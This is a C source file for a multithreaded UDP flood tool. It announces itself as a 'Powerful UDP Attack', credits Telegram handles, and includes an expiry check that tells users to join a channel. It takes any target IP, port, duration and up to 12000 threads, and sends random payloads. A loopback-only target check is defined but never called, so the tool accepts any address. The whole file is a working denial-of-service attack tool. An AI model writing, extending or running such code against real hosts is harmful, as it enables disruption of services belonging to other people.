#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <stdatomic.h>

// ================================
// 🚀 CONSTANTS & CONFIGURATION
// ================================
#define MAX_THREADS       12000
#define MAX_BUFFER_SIZE   6840
#define MAX_TOTAL_PACKETS 9840
#define DEFAULT_PPS       500
#define PAYLOAD_SIZE      4096
#define EXPIRATION_YEAR   2029
#define EXPIRATION_MONTH  10
#define EXPIRATION_DAY    12

// ================================
// 🌍 GLOBAL VARIABLES
// ================================
atomic_ulong totalSent = 0;
volatile sig_atomic_t stopFlag = 0;

// ================================
// ⏰ EXPIRATION CHECK
// ================================
void checkExpiration() {
    time_t now = time(NULL);
    struct tm *tm_now = localtime(&now);
    
    if ((tm_now->tm_year + 1900) > EXPIRATION_YEAR ||
        ((tm_now->tm_year + 1900) == EXPIRATION_YEAR && 
         (tm_now->tm_mon + 1) > EXPIRATION_MONTH) ||
        ((tm_now->tm_year + 1900) == EXPIRATION_YEAR && 
         (tm_now->tm_mon + 1) == EXPIRATION_MONTH && 
         tm_now->tm_mday > EXPIRATION_DAY)) {
        printf("❌ This file is closed by @TF_FLASH92. JOIN CHANNEL TO USE THIS FILE. @TF_FLASH92\n");
        exit(1);
    }
}

// ================================
// 🎯 TARGET VALIDATION
// ================================
int validateTarget(const char* ip) {
    struct in_addr addr;
    
    if (inet_pton(AF_INET, ip, &addr) != 1) {
        return -1;
    }
    
    unsigned long ip_num = ntohl(addr.s_addr);
    if ((ip_num >> 24) == 0x7F) {
        return 0;
    }
    
    return -1;
}

// ================================
// 📈 PACKET COUNTER MANAGEMENT
// ================================
int incrementSent() {
    unsigned long current = atomic_fetch_add(&totalSent, 1);
    return (current < MAX_TOTAL_PACKETS) ? 1 : 0;
}

// ================================
// 🎲 XORSHIFT PRNG ALGORITHM
// ================================
unsigned int xorshift32(unsigned int *state) {
    if (*state == 0) {
        *state = 123456789;
    }
    unsigned int x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

// ================================
// 📦 PAYLOAD GENERATOR
// ================================
void generatePayload(unsigned char *buffer, int size) {
    if (size <= 0) size = 128;
    if (size > MAX_BUFFER_SIZE) size = MAX_BUFFER_SIZE;
    
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
    
    long long timestamp = time(NULL) * 1000LL;
    snprintf((char*)buffer, size, "%lld", timestamp);
}

// ================================
// 👷 REGULAR UDP WORKER
// ================================
void* udpWorker(void* arg) {
    char** args = (char**)arg;
    char* target = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);
    int workerID = atoi(args[3]);
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return NULL;
    }
    
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    inet_pton(AF_INET, target, &dest_addr.sin_addr);
    
    time_t startTime = time(NULL);
    time_t endTime = startTime + duration;
    
    unsigned char* payload = malloc(PAYLOAD_SIZE);
    if (!payload) {
        close(sockfd);
        return NULL;
    }
    
    struct timespec sleepTime;
    sleepTime.tv_sec = 0;
    sleepTime.tv_nsec = 1000000000 / DEFAULT_PPS;
    
    while (time(NULL) < endTime && !stopFlag) {
        if (!incrementSent()) {
            break;
        }
        
        generatePayload(payload, PAYLOAD_SIZE);
        sendto(sockfd, payload, PAYLOAD_SIZE, 0, 
               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        
        nanosleep(&sleepTime, NULL);
    }
    
    free(payload);
    close(sockfd);
    return NULL;
}

// ================================
// 🚀 SUPER UDP PATTERN WORKER
// ================================
void* superUdpPattern(void* arg) {
    char** args = (char**)arg;
    char* target = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);
    int workerID = atoi(args[3]);
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return NULL;
    }
    
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    inet_pton(AF_INET, target, &dest_addr.sin_addr);
    
    time_t startTime = time(NULL);
    time_t endTime = startTime + duration;
    
    unsigned char* buffer = malloc(MAX_BUFFER_SIZE);
    if (!buffer) {
        close(sockfd);
        return NULL;
    }
    
    unsigned int prngState = time(NULL) & 0xffffffff;
    
    struct timespec sleepTime;
    sleepTime.tv_sec = 0;
    sleepTime.tv_nsec = 1000000000 / DEFAULT_PPS;
    
    while (time(NULL) < endTime && !stopFlag) {
        if (!incrementSent()) {
            break;
        }
        
        int payloadSize = 64 + (xorshift32(&prngState) % (MAX_BUFFER_SIZE - 64));
        if (payloadSize > MAX_BUFFER_SIZE) {
            payloadSize = MAX_BUFFER_SIZE;
        }
        
        for (int i = 0; i < payloadSize; i++) {
            buffer[i] = xorshift32(&prngState) % 256;
        }
        
        sendto(sockfd, buffer, payloadSize, 0, 
               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        
        nanosleep(&sleepTime, NULL);
    }
    
    free(buffer);
    close(sockfd);
    return NULL;
}

// ================================
// 🛑 SIGNAL HANDLER
// ================================
void signalHandler(int sig) {
    printf("\n🛑 Signal received, initiating graceful shutdown...\n");
    stopFlag = 1;
}

// ================================
// 🎯 MAIN FUNCTION
// ================================
int main(int argc, char *argv[]) {
    checkExpiration();
    
    if (argc != 5) {
        printf("📖 Usage: %s <IP> <PORT> <TIME_SECONDS> <THREADS>\n", argv[0]);
        printf("💡 Example: %s 127.0.0.1 8080 60 100\n", argv[0]);
        printf("💳 Full credit: @IZANA_KUROKAWAx92 : ꧁𓊈 塘• 𝐈 𝐙 𝐀 𝐍 𝐀 ᵏᵘʳᵒᵏᵃʷᵃ𓊉꧂\n");
        return 1;
    }
    
    char* ipAddress = argv[1];
    int portNumber = atoi(argv[2]);
    int durationSeconds = atoi(argv[3]);
    int threadCount = atoi(argv[4]);
    
    if (portNumber <= 0 || portNumber > 65535) {
        printf("❌ Invalid port number\n");
        return 1;
    }
    
    if (durationSeconds <= 0) {
        printf("❌ Invalid duration\n");
        return 1;
    }
    
    if (threadCount <= 0) threadCount = 1;
    if (threadCount > MAX_THREADS) {
        printf("⚠️ Thread count capped to %d\n", MAX_THREADS);
        threadCount = MAX_THREADS;
    }
    
    
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    printf("🔥 IZANA LOCAL Powerful UDP Attack Initialized\n");
    printf("🎯 Target: %s:%d\n", ipAddress, portNumber);
    printf("⏱️ Duration: %d seconds\n", durationSeconds);
    printf("🧵 Threads: %d\n", threadCount);
    printf("📦 Max Buffer: %d bytes\n", MAX_BUFFER_SIZE);
    printf("💳 Author: @IZANA_KUROKAWAx92\n");
    printf("⚡ Starting attack...\n\n");
    
    srand(time(NULL));
    
    pthread_t threads[threadCount];
    char* threadArgs[threadCount][4];
    
    for (int i = 0; i < threadCount; i++) {
        threadArgs[i][0] = ipAddress;
        threadArgs[i][1] = argv[2];
        threadArgs[i][2] = argv[3];
        threadArgs[i][3] = malloc(10);
        snprintf(threadArgs[i][3], 10, "%d", i);
    }
    
    int superWorkerCount = threadCount / 2;
    for (int i = 0; i < superWorkerCount; i++) {
        pthread_create(&threads[i], NULL, superUdpPattern, threadArgs[i]);
    }
    
    int regularWorkerCount = threadCount - superWorkerCount;
    for (int i = superWorkerCount; i < threadCount; i++) {
        pthread_create(&threads[i], NULL, udpWorker, threadArgs[i]);
    }
    
    for (int i = 0; i < threadCount; i++) {
        pthread_join(threads[i], NULL);
        free(threadArgs[i][3]);
    }
    
    printf("\n✅ Attack finished!\n");
    printf("📨 Total packets sent: %lu\n", totalSent);
    printf("🎯 Packet limit: %d\n", MAX_TOTAL_PACKETS);
    printf("💳 Full credit: @IZANA_KUROKAWAx92\n");
    
    return 0;
}
